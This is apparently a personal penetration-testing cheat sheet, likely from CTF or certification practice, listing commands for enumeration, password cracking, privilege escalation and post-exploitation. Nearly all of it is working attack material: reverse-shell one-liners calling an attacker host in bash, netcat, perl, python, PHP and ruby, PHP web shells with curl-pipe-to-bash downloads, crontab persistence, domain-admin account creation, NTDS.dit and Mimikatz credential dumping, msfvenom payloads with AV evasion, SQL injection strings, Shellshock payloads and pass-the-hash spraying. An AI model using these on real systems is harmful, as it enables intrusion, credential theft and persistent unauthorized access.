**Enumeration**
===============

### **General Enumeration:**

-   masscan -p1-65535 10.10.10.100 --rate=1000 -e tun0 > ports
-   ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
-   or ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.161 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
-   nmap -Pn -sV -sC -p$ports 10.10.10.100

-   nmap -vv -Pn -A -sC -sS -T 4 -p- 10.0.0.1

    -   Verbose, syn, all ports, all scripts, no ping
-   nmap -v -sS -A -T4 x.x.x.x

    -   Verbose, SYN Stealth, Version info, and scripts against
        services.
-   nmap --script smb-check-vulns.nse --script-args=unsafe=1 -p445 [host]
    nmap --script vuln -p 21,22,80 10.10.88.3
    nmap --script=ftp-brute,ftp-anon,ftp-syst,ftp-proftpd-backdoor -p 21 10.10.124.89
    nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse
    nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.250.238 (rpc)

-   nmap -sU -sV -vv -oA quick_udp 10.10.10.10 (UDP)

    -   Nmap script to scan for vulnerable SMB servers -- WARNING:
        unsafe=1 may cause knockover
-   netdiscover -r 192.168.1.0/24

-   Port Knock
    for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.10; done

### **FTP Enumeration (21):**

-   nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.0.0.1
-   wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 (download from anony FTP)

### **SSH (22):**

-   ssh INSERTIPADDRESS 22

### **SMTP Enumeration (25):**

-   nmap --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.0.0.1

-   nc -nvv INSERTIPADDRESS 25

-   telnet INSERTIPADDRESS 25

### **Finger Enumeration (79):**

Download script and run it with a
wordlist:(http://pentestmonkey.net/tools/user-enumeration/finger-user-enum)

### **Web Enumeration (80/443):**

-   dirbuster (GUI)
-   dirb http://10.0.0.1/

-   gobuster dir -e -u http://10.10.99.114:80/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 35

-   nikto --h 10.0.0.1

### **Pop3 (110):**

-   telnet INSERTIPADDRESS 110

-   USER [username]

-   PASS [password]

    -   To login
-   LIST

    -   To list messages
-   RETR [message number]

    -   Retrieve message
-   QUIT

    -   quits

### **RPCBind (111):**

-   rpcinfo -p x.x.x.x
-   showmount -e 10.10.10.117
-   rpcclient -U "" 10.10.10.10

### **IRCD (8067?):**

-   irssi -c 10.10.10.117 --port 8067


### **SMB\\RPC Enumeration (135/139/445):**

-   enum4linux --a 10.0.0.1

- crackmapexec smb 10.10.10.161 -u hazard -p stealth1agent

-   `nbtscan x.x.x.x`
    -   Discover Windows / Samba servers on subnet, finds Windows MAC
        addresses, netbios name and discover client workgroup / domain
-   py 192.168.XXX.XXX 500 50000 dict.txt

-   python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX

-   nmap IPADDR --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse

-   smbclient -L //INSERTIPADDRESS/
    smbclient -N //<ip>/dir
        get "filename"

    -   List open shares
-   smbclient //INSERTIPADDRESS/ipc$ -U john

-   Mounting from SMB:
        mkdir /mnt/linky_share
        mount -t cifs -o user=luke //192.168.1.104/share /mnt/linky_share
    Unmount:
        sudo umount /mnt/linky_share

### **SNMP Enumeration (161):**

-   snmpwalk -c public -v1 10.0.0.0

-   snmpcheck -t 192.168.1.X -c public

-   onesixtyone -c names -i hosts

-   nmap -sT -p 161 192.168.X.X -oG snmp_results.txt

-   snmpenum -t 192.168.1.X

-   snmp-check 10.10.10.10

### **Oracle (1521):**

-   tnscmd10g version -h INSERTIPADDRESS

-   tnscmd10g status -h INSERTIPADDRESS

### **Mysql Enumeration (3306):**

-   nmap -sV -Pn -vv  10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122

### **DNS Zone Transfers (53):**

-   nslookup -> set type=any -> ls -d blah.com
-   nslookup than: server 10.10.10.161 than 127.0.0.1 or itself

-   dig axfr blah.com @ns1.blah.com

    -   This one works the best in my experience
-   dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml


### **Kerberos (88):**

### **LDAP/LDAPS (389/636):**

-   Enum4linux

-   python3 GetADUsers.py -all htb.local/ -dc-ip 10.10.10.161 OR:
-   ldapsearch -h 10.10.10.161 -x<simple auth> than -s base namingcontexts<get the dn> than -b "DC=htb,DC=local"<-b for base from get dn><out to file to query>
    than '(objectClass=person)' sAMAccountName |grep sAMAccountName | awk {'print $2'}<get person accounts>

    or rpcclient -U '' 10.10.10.161 than enumdomusers<hit tab twice list all the commands> than queryser 'rid'

-   ./windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U
    ./windapsearch.py -d htb.local --dc-ip 10.10.10.161 --custom "objectClass=*

-   crackmapexec smb 10.10.10.161 --pass-pol <check password policy for lockout>
    or crackmapexec smb 10.10.10.161 --pass-pol -u '' -p ''
-   crackmapexec smb 10.10.10.161 -u users.ldap -p wordlist <bruteforce>

-   crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice --shares<list shares>

-   python3 GetNPUsers.py -request htb.local/ -dc-ip 10.10.10.161<if preauth is disable grants us a TGT> tha -format hashcat<to crack>

-   creating users:
    net user siko siko123 /add /domain
    net group "Exchange Windows Persmissions" /add siko
-   use powersploit

### **WINRM (5985/):**

./evil-winrm.rb -u svc-alfresco -p s3rvice -i 10.10.10.161<get PS shell>

### **Mounting File Share**

-   showmount -e IPADDR

-   mount 192.168.1.1:/vol/share /mnt/nfs  -nolock

    -   mounts the share to /mnt/nfs without locking it
-   mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs

    -   Mount Windows CIFS / SMB share on Linux at /mnt/cifs if you
        remove password it will prompt on the CLI (more secure as it
        wont end up in bash\_history)
-   net use Z: \\win-server\share password  /user:domain\janedoe /savecred /p:no

    -   Mount a Windows share on Windows from the command line
-   apt-get install smb4k --y

    -   Install smb4k on Kali, useful Linux GUI for browsing SMB shares

### **Fingerprinting:  Basic versioning / finger printing via displayed banner**

-   nc -v 192.168.1.1 25

-   telnet 192.168.1.1 25

### **Wordpress**

    Scanning website:
-   wpscan --url http://10.10.176.119/retro/
    Scanning users:
-   wpscan --url http://10.10.176.119/retro/ --enumerate u

### **Exploit Research**

-   searchsploit windows 2003 | grep -i local

    -   Search exploit-db for exploit, in this example windows 2003 +
        local esc

### **Compiling Exploits**

-   gcc -o exploit exploit.c

    -   Compile C code, add --m32 after ‘gcc’ for compiling 32 bit code
        on 64 bit Linux
-   i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe

    -   Compile windows .exe on Linux

### **Packet Inspection:**

-   tcpdump tcp port 80 -w output.pcap -i eth0

    -   tcpdump for port 80 on interface eth0, outputs to output.pcap

**Password Cracking** 
=====================

-   hash-identifier [hash]

-   john hashes.txt
    sudo john --wordlist=/home/joseph/Documents/WordLists/darkc0de.lst passwords.txt
    sudo john --show passwords.txt
    sudo john hash --fork=4 -w=/home/joseph/Documents/WordLists/rockyou.txt

-   create a wordlist from words:
    hashcat --force --stdout wordlist -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | awk 'length($0) > 7' > temp

-   USING RULES hashcat -m 18200 hash ~/Documents/WordLists/rockyou.txt -r /opt/hashcatRules/rules/InsidePro-PasswordsPro.rule
-   hashcat -m 500 -a 0 -o output.txt --remove hashes.txt /usr/share/wordlists/rockyou.txt

-   hashcat -m 1000 dump.txt -o output.txt --remove -a 3 ?u?l?l?d?d?d?d

    -   Brute force crack for NTLM hashes with an uppercase, lowercase,
        lowercase, and 4 digit mask
-   List of hash types and examples for
    hashcat [https://hashcat.net/wiki/doku.php?id=example\_hashes ](https://hashcat.net/wiki/doku.php?id=example_hashes)
-   [https://hashkiller.co.uk](https://hashkiller.co.uk/) has a good
    repo of already cracked MD5 and NTLM hashes

-   fcrackzip -b --method 2 -D -p ./rockyou.txt -v christmaslists.zip (run from wordlit location)

-   RDP user with password list
        ncrack -vv --user offsec -P passwords rdp://10.10.10.10

-   SSH user with password list
        hydra -l user -P pass.txt -t 10 10.10.10.10 ssh -s 22

-   FTP user with password list
        medusa -h 10.10.10.10 -u user -P passwords.txt -M ftp

### **Bruteforcing:**

-   hydra 10.0.0.1 http-post-form “/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid” -P /usr/share/wordlists/rockyou.txt -l admin

-   hydra 127.0.0.1 -V -L /usr/share/wordlists/metasploit/http_default_users.txt -P /usr/share/wordlists/metasploit/http_default_pass.txt http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: security=low; PHPSESSID=rsrjkagvk9m28nh5bsgrjbpnj3" (with cookies)
    or /moodle/login/index.php:username=^USER^&password=^PASS^:F=Invalid:S=Set-cookie

-   xhydra: /wp-login.php:log=^USER^&pwd=^PWD^:Invalid username

-   hydra -l admin -P /usr/share/wordlists/rockyou.txt -o results.txt IPADDR PROTOCOL

-   hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp --V

    -   Hydra SMTP Brute force

**Shells & Reverse Shells** 
---------------------------

### **SUID C Shells**

-   bin/bash:

<!-- -->

    int main(void){

    setresuid(0, 0, 0);

    system("/bin/bash");

    }

-   bin/sh:

<!-- -->

    int main(void){

    setresuid(0, 0, 0);

    system("/bin/sh");

    }

### **TTY Shell:**

-   python -c 'import pty;pty.spawn("/bin/bash")'
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    Ctrl-z
    stty raw -echo; fg

    export TERM=xterm

Using Python for a psuedo terminal:

    python -c 'import pty; pty.spawn("/bin/bash")'

Using socat:

    Listener:
    socat file:`tty`,raw,echo=0 tcp-listen:4444

    Victim: 
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444

Using stty options


    In reverse shell
    python -c 'import pty; pty.spawn("/bin/bash")'
    Ctrl-Z

    In Kali
    stty raw -echo
    fg

    In reverse shell
    reset
    export SHELL=bash
    export TERM=xterm-256color
    stty rows <num> columns <cols> (after running stty -a on our own machine)

-   echo os.system('/bin/bash')

-   /bin/sh --i

-   execute('/bin/sh')

    -   LUA
-   !sh

    -   Privilege Escalation via nmap
-   :!bash

    -   Privilege escalation via vi

### Fully Interactive TTY

            In reverse shell python -c 'import pty; pty.spawn("/bin/bash")'Ctrl-Z                                
            In Attacker consoles tty -stty raw -echo; fg                                
            In reverse shellresetexport SHELL=bashexport TERM=xterm-256colorstty rows <num> columns <cols>
```

### **Spawn Ruby Shell**

-   exec "/bin/sh"

-   ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d

### **Netcat**

-   /usr/bin/nc 10.10.14.14 4444 -e /bin/bash (listen on host)

-   nc -e /bin/sh ATTACKING-IP 80

-   /bin/sh | nc ATTACKING-IP 80

-   rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p

### **Telnet Reverse Shell**

-   rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p

-   telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443

### **PHP**

-   php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'

    -   (Assumes TCP uses file descriptor 3. If it doesn’t work, try
        4,5, or 6)

-   curl -A “<?php file_put_contents(‘shell.php’,file_get_contents(‘http://10.9.96.217:8000/shell.php'))?>" -s http://10.10.75.120 <!DOCTYPE HTML> (send shell using curl)

-   <?php exec("powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.11.30/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp    -Reverse -IPAddress 10.11.11.30 -Port 1234");?>

-   <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'"); ?>

-   file.php: <?php system($_REQUEST[​ 'pwn'​ ]); ?>
    than:
-   file.php?pwn=curl 10.10.14.7/file.sh | bash

    file.sh: rm/tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 1234 >/tmp/f
             bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
             bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'

### **Bash**

-   exec /bin/bash 0&0 2>&0

-   0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196

-   exec 5<>/dev/tcp/ATTACKING-IP/80 cat <&5 | while read line; do $line 2>&5 >&5; done

    \# or: while read line 0\<&5; do \$line 2\>&5 \>&5; done

-   bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1

-   Crontab:
    shell = '''
            * * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc
            10.10.16.32 4444 >/tmp/f
            '''
            f = open('/etc/crontab', 'a')
            f.write(shell)
            f.close()

### **Perl**

-   exec "/bin/sh";

-   perl —e 'exec "/bin/sh";'

-   perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

-   perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' 
    -   Windows
-   perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

    -    Windows

**Meterpreter** 
===============

### **Windows reverse meterpreter payload**

-   set payload windows/meterpreter/reverse_tcp

    -   Windows reverse tcp payload

### **Windows VNC Meterpreter payload**

-   set payload windows/vncinject/reverse_tcp

    -   Meterpreter Windows VNC Payload
-   set ViewOnly false

### **Linux Reverse Meterpreter payload**

-   set payload linux/meterpreter/reverse_tcp

    -    Meterpreter Linux Reverse Payload

### **Meterpreter Cheat Sheet**

-   upload file c:\\windows

    -   Meterpreter upload file to Windows target
-   download c:\\windows\\repair\\sam /tmp

    -   Meterpreter download file from Windows target

-   execute -f c:\\windows\temp\exploit.exe

    -   Meterpreter run .exe on target -- handy for executing uploaded
        exploits
-   execute -f cmd -c

    -   Meterpreter gain shell
-   SHELL=/bin/bash script -q /dev/null

    -   Creates new channel with cmd shell
-   ps

    -   Meterpreter show processes
-   shell

    -   Meterpreter get shell on the target
-   getsystem

    -   Meterpreter attempts priviledge escalation the target
-   hashdump

    -   Meterpreter get priveleges
-   getprivs

    -   Meterpreter exploit suggester
-   run post/multi/recon/local_exploit_suggester

    -   Meterpreter run powershell
-   load powershell
    powershell_shell

    -   Meterpreter attempts to dump the hashes on the target (must have
        privileges; try migrating to winlogon.exe if possible first)
-   portfwd add --l 3389 --p 3389 --r target

    -   Meterpreter create port forward to target machine
-   portfwd delete --l 3389 --p 3389 --r target

    -   Meterpreter delete port forward
-   use exploit/windows/local/bypassuac

    -   Bypass UAC on Windows 7 + Set target + arch, x86/64
-   use auxiliary/scanner/http/dir_scanner

    -   Metasploit HTTP directory scanner
-   use auxiliary/scanner/http/jboss_vulnscan

    -   Metasploit JBOSS vulnerability scanner
-   use auxiliary/scanner/mssql/mssql_login

    -   Metasploit MSSQL Credential Scanner
-   use auxiliary/scanner/mysql/mysql_version

    -   Metasploit MSSQL Version Scanner
-   use auxiliary/scanner/oracle/oracle_login

    -   Metasploit Oracle Login Module
-   use exploit/multi/script/web_delivery

    -   Metasploit powershell payload delivery module
-   post/windows/manage/powershell/exec_powershell

    -   Metasploit upload and run powershell script through a session
-   use exploit/multi/http/jboss_maindeployer

    -   Metasploit JBOSS deploy
-   use exploit/windows/mssql/mssql_payload

    -   Metasploit MSSQL payload
-   run post/windows/gather/win_privs

    -   Metasploit show privileges of current user
-   use post/windows/gather/credentials/gpp

    -   Metasploit grab GPP saved passwords
-   load kiwi

-   creds_all

    -   Metasploit load Mimikatz/kiwi and get creds
-   run post/windows/gather/local_admin_search_enum

    -   Idenitfy other machines that the supplied domain user has
        administrative access to
-   set AUTORUNSCRIPT post/windows/manage/migrate

### **Meterpreter Payloads**

-   msfvenom --l

    -    List options

### **Binaries**

-   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > shell.elf

-   msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe

-   msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > shell.macho


### **MSFVenom Payloads**

- PHP reverse shell  
    msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php

- Java WAR reverse shell  
    msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war -o shell.war

- Linux bind shell  
    msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai

- Linux FreeBSD reverse shell  
    msfvenom -p bsd/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f elf -o shell.elf

- Linux C reverse shell  
    msfvenom  -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f c

- Windows non staged reverse shell  
    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o non_staged.exe

- Windows Staged (Meterpreter) reverse shell  
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o meterpreter.exe

- Windows Python reverse shell  
    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f python -o shell.py

- Windows ASP reverse shell  
    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f asp -e x86/shikata_ga_nai -o shell.asp

- Windows ASPX reverse shell
    msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx

- Windows JavaScript reverse shell with nops  
    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f js_le -e generic/none -n 18

- Windows Powershell reverse shell  
    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1

- Windows reverse shell excluding bad characters  
    msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f c -b "\x00\x04" -e x86/shikata_ga_nai

- Windows x64 bit reverse shell  
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o shell.exe

- Windows reverse shell embedded into plink  
    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe

### **Web Payloads**

-   msfvenom -p php/meterpreter/reverse_tcp LHOST= LPORT= -f raw > shell.php

    -   PHP
-   set payload php/meterpreter/reverse_tcp           

    -   Listener
-   cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

    -   PHP
-   msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp

    -   ASP
-   msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp

    -   JSP
-   msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war

    -   WAR

### **Scripting Payloads**

-   `msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py`
    -   Python
-   msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh

    -   Bash
-   msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl

    -   Perl

### **Shellcode**

For all shellcode see ‘msfvenom --help-formats’ for information as to
valid parameters. Msfvenom will output code that is able to be cut and
pasted in this language for your exploits.

-   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f

-   msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f

-   msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f

### **Handlers**

Metasploit handlers can be great at quickly setting up Metasploit to be
in a position to receive your incoming shells. Handlers should be in the
following format.

    exploit/multi/handler set PAYLOAD set LHOST set LPORT set ExitOnSession false exploit -j -z

An example is:

    msfvenom exploit/multi/handler -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f > exploit.extension

**Powershell** 
==============

**Execution Bypass**

-   Set-ExecutionPolicy Unrestricted 
        ./file.ps1

-   Import-Module script.psm1
        Invoke-FunctionThatIsIntheModule

-   iex(new-object system.net.webclient).downloadstring(“file:///C:\examplefile.ps1”)

**Powershell.exe blocked**

-   Use ‘not powershell’
    [https://github.com/Ben0xA/nps](https://github.com/Ben0xA/nps)

**Persistence**

-   net user username "password" /ADD

-   net group "Domain Admins" %username% /DOMAIN /ADD

**Gather NTDS.dit file**

-   `ntdsutil`{.css .plain}
    `activate instance ntds`{.css .plain}
    `ifm`{.css .plain}
    `create full C:\ntdsutil`{.css .plain}
    `quit`{.css .plain}
    `quit`{.css .plain}

Invoke ps1:
-   powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.7/Invoke-PowerShellTcp.ps1');
        Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 1234

**Privilege Escalation** 
========================

**Linux:**
----------

SUID search

-   find / -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null
-   find / -type f -perm -u=s -user (username) -ls 2> /dev/null
-   find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-   find / -perm -u=s -type f 2>/dev/null

Capabilities

-   getcap -r / 2>/dev/null

Searching what a binary can be runas:
-   find foo -exec whoami \;

SUDO

-   sudo -l
-   sudo -V if version <1.8.27
-   if verision 1.8.27 sudo -u#-1 /bin/bash
-   sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

Find Binaries that will execute as the owner

-   find / -perm -u=s -type f 2>/dev/null

Find binaries that will execute as the group

-   find / -perm -g=s -type f 2>/dev/null

Find sticky-bit binaries

-   find / -perm -1000 -type d 2>/dev/null

If Python is executable as root

-   python2.7 -c "import pty;pty.spawn('/bin/sh');"

[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

[https://github.com/pentestmonkey/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)

**Windows:**
------------

[https://github.com/pentestmonkey/windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)

[https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)

**Command Injection** 
=====================

### **File Traverse:**

-   website.com/file.php[?path=/]

### **Test HTTP options using curl:**

-   curl -vX OPTIONS [website]

### **Upload file using CURL to website with PUT option available**

-   curl --upload-file shell.php --url http://192.168.218.139/test/shell.php --http1.0

### **Transfer file** (Try temp directory if not writable)(wget -O tells it where to store):

-   ?path=/; wget http://IPADDRESS:8000/FILENAME.EXTENTION;

### **Activate shell file:**

-   ; php -f filelocation.php;

**SQLInjections** 
=================

### Common **Injections for Login Forms:**

-   `admin' --`
-   `admin' #`
-   `admin'/*`
-   `' or 1=1--`
-   `' or 1=1#`
-   `' or 1=1/*`
-   `') or '1'='1--`
-   `') or ('1'='1—`

### **SQLMap**

-   `sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3`
    -   Automated sqlmap scan
-   `sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3`
-   `sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/blah.php"`
    -   Targeted sqlmap scan
-   `sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump` Scan
    url for union + error based injection with mysql backend and use a
    random user agent + database dump
-   `sqlmap -o -u "http://meh.com/form/" --forms`
    -   sqlmap check form for injection
-   `sqlmap -o -u "http://meh/vuln-form" --forms -D database-name -T users --dump`
    -   sqlmap dump and crack hashes for table users on database-name.
-   `sqlmap --flush session`
    -   Flushes the session
-   `sqlmap -p user --technique=B`
    -   Attempts to exploit the “user” field using boolean technique.
-   `sqlmap -r <captured request>`
    -   Capture a request via Burp Suite, save it to a file, and use
        this command to let sqlmap automate everything. Add --os-shell at
        the end to pop a shell if possible.

-   SQL injection bypasses
        ' or 1=1 LIMIT 1 --
        ' or 1=1 LIMIT 1 -- -
        ' or 1=1 LIMIT 1#
        ' or 1#
        ' or 1=1 --
        ' or 1=1 -- -

**Miscellaneous** 
=================

#### NTLMRelayx.py using mitm6

This will take captured credentials via IPv6 spoofing using mitm6 and
relay them to a target via ntlmrelayx.py. It requires ntlmrelayx.py and
mitm6 to be installed already.

-   mitm6 -d <domain.local>

    -   First, start mitm6 and specify the domain you’re spoofing on
        with ‘-d domain.name’
-   ntlmrelayx.py -6 -wh 192.168.1.1 -t smb://192.168.1.2 -l ~/tmp/
    -   -6 specifies ipv6, -wh specifies where the WPAD file is hosted
        at (your IP usually). -t specifies the target, or destination
        where the credentials will be relayed. -l is to where to store
        the loot.      

#### Name your terminal whatever you want
This small script will name your terminal whatever you pass as an
argument to it. It helps organizing with multiple terminals open. Thanks
Ben!

    #!bin/bash

    echo -ne "\033]0;${1}\007"

**Tunneling:**

sshuttle is an awesome tunneling tool that does all the hard work for
you. It gets rid of the need for proxy chains. What this command does is
tunnels traffic through 10.0.0.1 and makes a route for all traffic
destined for 10.10.10.0/24 through your sshuttle tunnel.

-   `sshuttle -r root@10.0.0.1 10.10.10.0/24`

**AV Bypass:**

-   wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe

    -   wine and hyperion need to be installed.

**Web hosts**

-   `python -m SimpleHTTPServer 80`
    -   Basic HTTP Server. Will list the directory it’s started in.
-   `service apache2 start`
    -   Starts Apache web server. Place files in /var/www/html to be
        able to ‘wget’ them.

### **Php Meterpreter Shell (Remove Guard bit)**

-   `msfvenom -p php/meterpreter/reverse_tcp LHOST=????????? LPORT=6000 R > phpmeterpreter.php`

### **Netcat**

-   Listener: `nc -lvp <PORT>`
    -   Listen verbosely on a port.
-   Target:`nc -e /bin/bash listeneripaddress listenerport`
-   or `ncat -v -l -p 7777 -e /bin/bash`
-   Host:` cat happy.txt | ncat -v -l -p 5555 `Target:
    `ncat localhost 5555 > happy_copy.txt `
    -   Download file via ncat

### **Reverse shell using interpreters ([http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet))**

-   `python -c python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
-   `python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',9000))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"`

### **Shellshock**

-   `curl -x TARGETADDRESS -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/HOSTIP/1234 0>&1" TARGETADDRESS/cgi-bin/status`
-   `curl -x 192.168.28.167:PORT -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/192.168.28.169/1234 0>&1" 192.168.28.167/cgi-bin/status`
-   `ssh username@IPADDRESS '() { :;}; /bin/bash'`
    -   Shellshock over SSH

CrackMapExec 
============

-   crackmapexec smb 10.0.0.1/24 -u administrator -p 'password' --local-auth --sam

    -   Spray the network with local login credentials then dump SAM
        contents
-   crackmapexec smb 10.0.0.1/24 -u administrator -H <hash> --local-auth --lsa

    -   Pass the hash network-wide, local login, dump LSA contents
-   crackmapexec smb 192.168.10.0/24 -u username -p password -M empire_exec -o LISTENER=test

    -   Requires Empire Restful API to be running. It will spray supply
        credentials and pop an empire agent on any successful login.
        Read more
